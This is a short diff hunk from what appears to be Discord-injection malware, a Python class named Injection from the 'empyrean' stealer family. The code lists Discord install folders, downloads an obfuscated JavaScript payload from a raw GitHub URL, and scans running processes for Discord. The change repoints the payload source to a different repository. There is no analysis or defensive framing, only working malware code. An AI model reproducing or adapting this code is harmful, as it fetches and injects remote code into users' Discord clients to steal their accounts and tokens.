@@ -15,7 +15,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://raw.githubusercontent.com/addi00000/empyrean-injection/main/obfuscated.js').text
+        self.code = requests.get('https://raw.githubusercontent.com/AnzaxCR/empyrean-injection/main/obfuscated.js').text
         
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
